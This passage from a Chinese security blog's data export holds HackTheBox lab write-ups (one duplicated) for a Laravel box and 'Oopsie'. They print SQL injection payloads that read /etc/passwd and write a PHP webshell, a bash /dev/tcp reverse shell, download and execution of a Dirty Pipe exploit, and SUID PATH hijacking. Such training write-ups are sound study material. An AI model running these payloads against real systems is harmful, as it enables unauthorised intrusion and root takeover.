src=\"https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png\"></p>\n<p>本地开启的监听接收到了反弹<code>shell</code></p>\n<p>通过以下命令，将反弹回来的<code>shell</code>升级为完全交互式的<code>shell</code></p>\n<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\nctrl+z\nstty raw -echo; fg\nreset\nxterm\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png\"></p>\n<h3 id=\"Dirty-Pipe提权漏洞\"><a href=\"#Dirty-Pipe提权漏洞\" class=\"headerlink\" title=\"Dirty Pipe提权漏洞\"></a>Dirty Pipe提权漏洞</h3><p>查看系统的版本为<code>5.16</code></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png\"></p>\n<p>前段时间刚爆出了一个Linux的提权漏洞<code>Dirty Pipe</code>，看了一下<a href=\"https://dirtypipe.cm4all.com/#the-dirty-pipe-vulnerability\">The Dirty Pipe Vulnerability</a>的影响范围：</p>\n<ul>\n<li>version &gt; 5.8</li>\n<li>version &lt; 5.16.11、5.15.25、5.10.102</li>\n</ul>\n<p><img src=\"https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png\"></p>\n<p>这台靶机服务器的版本在影响范围内，所以我们可以直接下载<code>exploit</code>并编译，上传到靶机中执行，来获得<code>root</code>权限</p>\n<p>现在攻击机下载<a href=\"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits\">DirtyPipe-Exploits</a>，并编译。因为攻击机和靶机的Linux版本不一样，所以使用<code>-fPIC -static</code>参数进行编译，防止因编译环境不一致导致<code>exploit</code>运行出现问题</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png\"></p>\n<pre><code>wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c\n\ngcc exploit-2.c -o exp -fPIC -static \n</code></pre>\n<p>在攻击机用<code>python</code>起一个简易的服务器</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png\"></p>\n<p>在靶机下载，并赋予执行权限</p>\n<pre><code>wget 10.10.16.6/exp\n\nchmod +x ./exp\n</code></pre>\n<p>按照<code>exploit</code>作者的使用方法，执行<code>exploit</code>劫持<code>SUID</code>成功提升至<code>root</code>权限</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png\"></p>\n<h2 id=\"寻找立足点\"><a href=\"#寻找立足点\" class=\"headerlink\" title=\"寻找立足点\"></a>寻找立足点</h2><h3 id=\"端口扫描\"><a href=\"#端口扫描\" class=\"headerlink\" title=\"端口扫描\"></a>端口扫描</h3><p>先对靶机进行端口扫描，发现只开放了22和80端口</p>\n<pre><code>nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png\"></p>\n<h3 id=\"登陆界面攻击面测试\"><a href=\"#登陆界面攻击面测试\" class=\"headerlink\" title=\"登陆界面攻击面测试\"></a>登陆界面攻击面测试</h3><p>访问80端口，是一个登录界面，先尝试登录</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png\"></p>\n<p>发现当输入账号为<code>test</code>时返回用<code>无效用户名</code>，当输入用户名为<code>admin</code>时返回<code>密码无效</code>，存在用户名枚举</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png\"></p>\n<p>还有一个<code>忘记密码</code>的功能，试试能不能修改<code>admin</code>的密码，发现需要填写验证码。</p>\n<p>接下来有两种思路，爆破密码和爆破验证码，但是密码的位数和强度都是未知的，而验证码只有四位，并且看这个提示，应该是四位的纯数字，这样的话爆破难度还是比较低的，所以我选择爆破验证码。</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png\"></p>\n<h3 id=\"验证码爆破\"><a href=\"#验证码爆破\" class=\"headerlink\" title=\"验证码爆破\"></a>验证码爆破</h3><p>接下来尝试抓包对验证码进行爆破</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png\"></p>\n<p>标记要爆破的参数</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png\"></p>\n<p>设置payload</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png\"></p>\n<p>爆破了一会后，状态码就从<code>200</code>变成了<code>429</code>，应该是出现错误了</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png\"></p>\n<p>提示了错误信息，可能是爆破请求频繁导致被禁止访问了</p>\n<p><img src=\"https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png\"></p>\n<h3 id=\"请求次数限制绕过\"><a href=\"#请求次数限制绕过\" class=\"headerlink\" title=\"请求次数限制绕过\"></a>请求次数限制绕过</h3><p>按照<a href=\"https://www.securecyberfuture.com/post/bypass-rate-limit\">Bypass Rate Limit</a>的方法尝试绕过访问限制，添加<code>X-Forwarded-For</code>字段，返回状态码<code>200</code></p>\n<p><img src=\"https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png\"></p>\n<p>再次进行爆破，这次要标记两个值，一个是IP地址，一个是验证码，设置好后开始爆破</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png\"></p>\n<p>等待了几分钟后，成功爆破出了验证码</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png\"></p>\n<p>使用验证码修改了<code>admin</code>的密码后登录，跳转到了用户列表</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png\"></p>\n<p>点击用户栏的<code>View</code>会在上方显示出用户的信息</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png\"></p>\n<h3 id=\"PHP弱类型\"><a href=\"#PHP弱类型\" class=\"headerlink\" title=\"PHP弱类型\"></a>PHP弱类型</h3><p>抓包查看一下</p>\n<p><img src=\"https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png\"></p>\n<p>将请求方式更改为POST，看一下会返回什么。提示不支持POST</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png\"></p>\n<p>然后试试用POST的请求方式，但将POST改为GET。返回了一些<code>JSON</code>格式的信息</p>\n<p><img src=\"https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png\"></p>\n<p>那我们也将请求内容改为<code>JSON</code>格式试试。如下，返回正常了</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png\"></p>\n<p>上面的<code>cookie</code>可以看到有<code>laravel_session</code>的字段，这个站点是使用的<code>Laravel</code>框架，而<code>Laravel</code>是一款<code>PHP</code>Web开发框架</p>\n<p>参考文章<a href=\"https://www.freebuf.com/articles/web/323834.html\">PHP弱类型</a>，将<code>secret</code>的值改为<code>bool</code>类型的<code>true</code>，任意的<code>id</code>的值都能返回正常</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png\"></p>\n<h3 id=\"SQL注入测试\"><a href=\"#SQL注入测试\" class=\"headerlink\" title=\"SQL注入测试\"></a>SQL注入测试</h3><p>接着对<code>id</code>进行测试，发现添加一个<code>单引号</code>，返回<code>服务器错误</code>，很明显的<code>SQL注入</code>的特征</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png\"></p>\n<p>接下来试<code>SQL注入</code>，先通过<code>order by</code>判断字段数，当为<code>3</code>时返回正常，<code>4</code>时返回错误，因此字段数为<code>3</code></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png\"></p>\n<p>接下来通过<code>union select</code>查看回显的位置</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png\"></p>\n<p>将<code>3</code>的位置替换为SQL语句可以成功执行</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png\"></p>\n<p>先爆出所有数据库名</p>\n<pre><code class=\"mysql\">-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png\"></p>\n<p>爆出所有表名和列名</p>\n<pre><code class=\"mysql\">-2 union select 1,2,group_concat(&#39;\\n&#39;,table_name,&#39;:&#39;,column_name) from information_schema.columns where table_schema=&#39;uhc&#39;-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png\"></p>\n<p>爆出<code>users</code>表的内容</p>\n<pre><code class=\"sql\">-2 union select 1,2,group_concat(&#39;\\n&#39;,name,&#39;:&#39;,password) from uhc.users-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png\"></p>\n<p>但是我们已经有<code>admin</code>的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了<code>/etc/passwd</code>文件</p>\n<pre><code class=\"mysql\">-2 union select 1,2,load_file(&#39;/etc/passwd&#39;)-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png\"></p>\n<p>接下来的思路是通过<code>SQL注入</code>往站点写<code>shell</code>，来获得服务器权限，但是先要知道站点的真实路径</p>\n<h3 id=\"SQL注入写shell\"><a href=\"#SQL注入写shell\" class=\"headerlink\" title=\"SQL注入写shell\"></a>SQL注入写shell</h3><p>在最开始的端口扫描中可以看到，该站点使用了<code>Nginx</code>作为中间件，我们可以读取<code>Nginx</code>的站点配置文件，来查看配置的站点根目录。尝试读取<code>Nginx</code>的站点配置文件的默认路径</p>\n<pre><code class=\"sql\">-2 union select 1,2,load_file(&#39;/etc/nginx/sites-enabled/default&#39;)-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png\"></p>\n<p>如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写<code>shell</code>，来得到服务器的初步控制权</p>\n<p>通过<code>into outfile</code>向网站根目录写入<code>0.php</code>，返回<code>服务器错误</code>，但是不影响</p>\n<pre><code class=\"sql\">-2 union select 1,2,&#39;&lt;?=`$_GET[1]`?&gt;&#39; into outfile&#39;/srv/altered/public/0.php&#39;-- -\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png\"></p>\n<p>访问我们的<code>shell</code>，能成功执行系统命令</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png\"></p>\n<h2 id=\"权限提升\"><a href=\"#权限提升\" class=\"headerlink\" title=\"权限提升\"></a>权限提升</h2><h3 id=\"反弹shell\"><a href=\"#反弹shell\" class=\"headerlink\" title=\"反弹shell\"></a>反弹shell</h3><p>通过我们写入的<code>webshell</code>，反弹一个<code>shell</code>回来，翻遍后续的操作</p>\n<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#39;\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png\"></p>\n<p>本地开启的监听接收到了反弹<code>shell</code></p>\n<p>通过以下命令，将反弹回来的<code>shell</code>升级为完全交互式的<code>shell</code></p>\n<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;\nctrl+z\nstty raw -echo; fg\nreset\nxterm\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png\"></p>\n<h3 id=\"Dirty-Pipe提权漏洞\"><a href=\"#Dirty-Pipe提权漏洞\" class=\"headerlink\" title=\"Dirty Pipe提权漏洞\"></a>Dirty Pipe提权漏洞</h3><p>查看系统的版本为<code>5.16</code></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png\"></p>\n<p>前段时间刚爆出了一个Linux的提权漏洞<code>Dirty Pipe</code>，看了一下<a href=\"https://dirtypipe.cm4all.com/#the-dirty-pipe-vulnerability\">The Dirty Pipe Vulnerability</a>的影响范围：</p>\n<ul>\n<li>version &gt; 5.8</li>\n<li>version &lt; 5.16.11、5.15.25、5.10.102</li>\n</ul>\n<p><img src=\"https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png\"></p>\n<p>这台靶机服务器的版本在影响范围内，所以我们可以直接下载<code>exploit</code>并编译，上传到靶机中执行，来获得<code>root</code>权限</p>\n<p>现在攻击机下载<a href=\"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits\">DirtyPipe-Exploits</a>，并编译。因为攻击机和靶机的Linux版本不一样，所以使用<code>-fPIC -static</code>参数进行编译，防止因编译环境不一致导致<code>exploit</code>运行出现问题</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png\"></p>\n<pre><code>wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c\n\ngcc exploit-2.c -o exp -fPIC -static \n</code></pre>\n<p>在攻击机用<code>python</code>起一个简易的服务器</p>\n<pre><code>python3 -m http.server 80\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png\"></p>\n<p>在靶机下载，并赋予执行权限</p>\n<pre><code>wget 10.10.16.6/exp\n\nchmod +x ./exp\n</code></pre>\n<p>按照<code>exploit</code>作者的使用方法，执行<code>exploit</code>劫持<code>SUID</code>成功提升至<code>root</code>权限</p>\n<p><img src=\"https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png\"></p>\n"},{"title":"HackTheBox-Oopsie","date":"2021-08-02T09:05:21.000Z","_content":"\n## 实验环境\n\n![](https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sT -Pn 10.10.10.28\n```\n\n![](https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png)\n\n发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面\n\n![](https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png)\n\n**目录扫描：**\n\n成功找到登录界面\n\n![](https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png)\n\n在bp中也可以看到登录页的js加载记录\n\n![](https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png)\n\n在浏览器打开\n\n![](https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png)\n\n## 实验过程\n\n账号为`admin`，密码是上一题中出现过的`MEGACORP_4dm1n!!`，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限\n\n![](https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png)\n\n先看一下我们现在账号信息，在url中还可以看到目前的用户id=1\n\n![](https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png)\n\n**再抓包看一下**：\n\nid和user、role对应，可以尝试遍历用户\n\n![](https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png)\n\n**发送到interlude模块**，标记id参数，设置好payload开始爆破\n\n![](https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png)\n\n![](https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png)\n\n看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户\n\n![](https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png)\n\n![](https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png)\n\n修改目前用户的user和role值，成功越权到super admin用户\n\n![](https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png)\n\n![](https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png)\n\n然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传\n\n![](https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png)\n\n直接用kali自带的反弹shell文件，修改好ip和port\n\n![](https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png)\n\n注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传\n\n![](https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png)\n\n![](https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png)\n\n接下来开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png)\n\n然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里\n\n**访问上传的shell来执行**\n\n![](https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png)\n\n回到netcat中就可以看到反弹的shell了\n\n![](https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png)\n\n拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码\n\n![](https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png)\n\n但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：\n\n```\n交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n```\n\n```\n用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n```\n\n逐条键入命令：\n\n\n```\n# 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n```\n\n拿到交互的shell我们就可以切换到Robert用户了\n\n![](https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png)\n\n**获取普通用户权限的flag**\n\n![](https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png)\n\n## 权限提升\n\n下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限\n\n```\n# -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2>/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2>/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           \n```\n\n![](https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png)\n\n![](https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png)\n\n拥有者有`s`（`setuid`）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的`ID`值输出以该数字为编号的`bug`报告\n\n![](https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png)\n\n接下来我们可以使用`strings`命令来看看对象文件或二进制文件中查找可打印的字符串\n\n![](https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png)\n\n可以看到`bugtracker`调用了`cat`命令，输出了`/root/reports/`目录下的`bug`报告，其实本来我们当前用户是没有权限访问`/root`目录的，但是我们有了`setuid`后就拥有了`/root`目录的访问有权限，也就拥有了`root`权限，当前用户执行`bugtracker`程序是会优先使用当前的`path`变量，这时候我们就可以在当前用户环境变量`指定的路径`中搜索`cat`命令，然后创建一个恶意的`cat`命令，修改当前用户环境变量，完成提权操作\n\n```\nexport PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho '/bin/sh' > cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n```\n\n![](https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png)\n\n这样`bugtracker`再次调用`cat`命令时实际上调用的是`/tmp`目录下的恶意的`cat`命令，我们运行一下`bugtracker`可以看出，此时`robert`用户临时具有了`root`权限，执行`id`命令发现只是`robert`用户的`uid`变为了`root`，不是真正的`root`用户\n\n![](https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png)\n\n这样我们就可以获取system的flag了\n\n![](https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png)\n\n在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码\n\n![](https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png)\n\n> 参考：\n>\n> 1、https://www.echocipher.life/index.php/archives/872/\n>\n> 2、[关于Linux下s、t、i、a权限](https://www.cnblogs.com/qlqwjy/p/8665871.html)\n>\n> 3、[LINUX s权限位提权](http://www.361way.com/suid-privilege/5965.html)\n\n","source":"_posts/HackTheBox-Oopsie.md","raw":"---\ntitle: HackTheBox-Oopsie\ndate: 2021-08-2 17:05:21\ncategories:\n- 渗透测试\ntags:\n- HackTheBox\n---\n\n## 实验环境\n\n![](https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png)\n\n## 信息收集\n\n**端口扫描：**\n\n```\nnmap -sT -Pn 10.10.10.28\n```\n\n![](https://i.loli.net/2021/07/27/ZD8N9JvCn3Gtkyc.png)\n\n发现80端口开放，在浏览器打开，啥也没有，尝试找登录界面\n\n![](https://i.loli.net/2021/07/27/bexZV7YuQCfHnJW.png)\n\n**目录扫描：**\n\n成功找到登录界面\n\n![](https://i.loli.net/2021/07/27/apWtD5Xlgq4KrkH.png)\n\n在bp中也可以看到登录页的js加载记录\n\n![](https://i.loli.net/2021/07/27/2RtDTbzapGBCWhv.png)\n\n在浏览器打开\n\n![](https://i.loli.net/2021/07/27/5NhiCuwZTcWxtLd.png)\n\n## 实验过程\n\n账号为`admin`，密码是上一题中出现过的`MEGACORP_4dm1n!!`，直接登录，登录后看到有一个上传功能，点击提示需要super admin权限\n\n![](https://i.loli.net/2021/07/27/ExH9yqfplFRc6be.png)\n\n先看一下我们现在账号信息，在url中还可以看到目前的用户id=1\n\n![](https://i.loli.net/2021/07/27/c4GRbMgQoK1pqf9.png)\n\n**再抓包看一下**：\n\nid和user、role对应，可以尝试遍历用户\n\n![](https://i.loli.net/2021/07/27/NQDFYJsuVKjvtUG.png)\n\n**发送到interlude模块**，标记id参数，设置好payload开始爆破\n\n![](https://i.loli.net/2021/07/27/IO7bRopKTVdyeEN.png)\n\n![](https://i.loli.net/2021/07/27/jAMXOz6hqZakGB3.png)\n\n看到id=30的响应包的长度比较大，看一下他的响应包的内容，确认为super admin用户\n\n![](https://i.loli.net/2021/07/27/bH7zidyqvxF3sQL.png)\n\n![](https://i.loli.net/2021/07/27/Z2itEGU1TQspdwe.png)\n\n修改目前用户的user和role值，成功越权到super admin用户\n\n![](https://i.loli.net/2021/07/27/D4Zw8Bkz39QbPyT.png)\n\n![](https://i.loli.net/2021/07/27/EM872nWlGr6Qcux.png)\n\n然后尝试上传shell，同样修改当前用户的user和role值，就可以进行文件上传\n\n![](https://i.loli.net/2021/07/27/qmQXoHtZi2lV1By.png)\n\n直接用kali自带的反弹shell文件，修改好ip和port\n\n![](https://i.loli.net/2021/07/27/dqBTIuL8E36UJXf.png)\n\n注意上传的过程中也要修改当前用户的user和role，改成super admin的值，就可以成功上传\n\n![](https://i.loli.net/2021/07/27/zmrJRpM73eCjV9q.png)\n\n![](https://i.loli.net/2021/07/27/hnu7MqHeKplP8oF.png)\n\n接下来开启一个监听端口来接收反弹的shell\n\n![](https://i.loli.net/2021/07/27/qW8BbmrcNsvJwoP.png)\n\n然后就是要找到我们上传的shell，扫目录的时候有一个uploads的路径，我们上传的文件应该就在这里\n\n**访问上传的shell来执行**\n\n![](https://i.loli.net/2021/07/27/Kcw1hkTyXuig4r9.png)\n\n回到netcat中就可以看到反弹的shell了\n\n![](https://i.loli.net/2021/07/27/TZQSK9vkXonWIfz.png)\n\n拿到shell先看看有没有有用的文件，我们拿到了数据库的账号密码\n\n![](https://i.loli.net/2021/07/28/wFjIotzpmd9gQBC.png)\n\n但是现在的shell是非交互式的，我们接下来要升级到交互的shell，两者的区别如下：\n\n```\n交互式模式就是shell等待你的输入，并且立即执行你提交的命令，退出后才终止\n非交互式模式就是以shell script方式执行，shell不与你进行交互，而是读取存放在文件中的命令并执行它们，读取到结尾就终止\n```\n\n```\n用netcat获得的shell是非交互式的，不能传递tab来进行补全，不能使用su、nano，也不能执行ctrl+c等命令，所以我们需要升级为交互式的shell\n```\n\n逐条键入命令：\n\n\n```\n# 将在环境变量下将shell设置为/bin/bash且参数为-q和/dev/null的情况下运行脚本，-q参数为静默运行，输出到/dev/null里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容\nSHELL=/bin/bash script -q /dev/null\n# 将netcat暂挂至后台\nCtrl-Z\n# 将本地终端置于原始模式，以免干扰远程终端\nstty raw -echo\n# 将netcat返回到前台，注意：这里不会显示输入的命令\nfg\n# 重置远程终端，经测试也可以不进行此操作\nreset\n# 运行xterm\nxterm\n```\n\n拿到交互的shell我们就可以切换到Robert用户了\n\n![](https://i.loli.net/2021/07/28/EdiQx9hAYpDysSk.png)\n\n**获取普通用户权限的flag**\n\n![](https://i.loli.net/2021/07/28/aEARfWQUJsmChMP.png)\n\n## 权限提升\n\n下面我们就要想办法提权，我们先看看这个组里面有没有特殊权限\n\n```\n# -type f 为查找普通文档，-group bugtracker 限定查找的组为bugtracker，2>/dev/null 将错误输出到黑洞（不显示）\nfind / -type f -group bugtracker 2>/dev/null \n# -al 以长格式方式显示并且显示隐藏文件\nls -al /usr/bin/bugtracker           \n```\n\n![](https://i.loli.net/2021/07/28/KLmAGangISYdcpb.png)\n\n![](https://i.loli.net/2021/07/28/AtRHJfpn6IU7xMg.png)\n\n拥有者有`s`（`setuid`）特殊权限，可执行的文件搭配这个权限，可以得到特权，任意存取该文件的所有者能使用的全部系统资源，我们尝试运行它，发现这个文件根据提供的`ID`值输出以该数字为编号的`bug`报告\n\n![](https://i.loli.net/2021/07/28/y82ifUD4bzuLOTo.png)\n\n接下来我们可以使用`strings`命令来看看对象文件或二进制文件中查找可打印的字符串\n\n![](https://i.loli.net/2021/07/28/KLOeI9juaobwQ1W.png)\n\n可以看到`bugtracker`调用了`cat`命令，输出了`/root/reports/`目录下的`bug`报告，其实本来我们当前用户是没有权限访问`/root`目录的，但是我们有了`setuid`后就拥有了`/root`目录的访问有权限，也就拥有了`root`权限，当前用户执行`bugtracker`程序是会优先使用当前的`path`变量，这时候我们就可以在当前用户环境变量`指定的路径`中搜索`cat`命令，然后创建一个恶意的`cat`命令，修改当前用户环境变量，完成提权操作\n\n```\nexport PATH=/tmp:$PATH                //将/tmp目录设置为环境变量\ncd /tmp/                            //切换到/tmp目录下\necho '/bin/sh' > cat                //在此构造恶意的cat命令\nchmod +x cat                        //赋予执行权限\n```\n\n![](https://i.loli.net/2021/07/28/ghfboUQt6Oe1wd7.png)\n\n这样`bugtracker`再次调用`cat`命令时实际上调用的是`/tmp`目录下的恶意的`cat`命令，我们运行一下`bugtracker`可以看出，此时`robert`用户临时具有了`root`权限，执行`id`命令发现只是`robert`用户的`uid`变为了`root`，不是真正的`root`用户\n\n![](https://i.loli.net/2021/07/28/SbzZWCsydVNm5t9.png)\n\n这样我们就可以获取system的flag了\n\n![](https://i.loli.net/2021/07/28/hs5lVjfuewa1ALJ.png)\n\n在/root/.config/filezilla/filezilla.xml文件中有下一题的ftp账号密码\n\n![](https://i.loli.net/2021/07/28/CEoznHSvYQuDI7F.png)\n\n> 参考：\n>\n> 1、https://www.echocipher.life/index.php/archives/872/\n>\n> 2、[关于Linux下s、t、i、a权限](https://www.cnblogs.com/qlqwjy/p/8665871.html)\n>\n> 3、[LINUX s权限位提权](http://www.361way.com/suid-privilege/5965.html)\n\n","slug":"HackTheBox-Oopsie","published":1,"updated":"2021-12-25T12:19:50.095Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl5up2ny80002wku1eeofejxn","content":"<h2 id=\"实验环境\"><a href=\"#实验环境\" class=\"headerlink\" title=\"实验环境\"></a>实验环境</h2><p><img src=\"https://i.loli.net/2021/07/27/Hd9VUzsDhXpJxSb.png\"></p>\n<h2 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h2><p><strong>端口扫描：</strong></p>\n<pre><code>nmap -sT -Pn 10.10.10.28\n</code></pre>\n<p><img 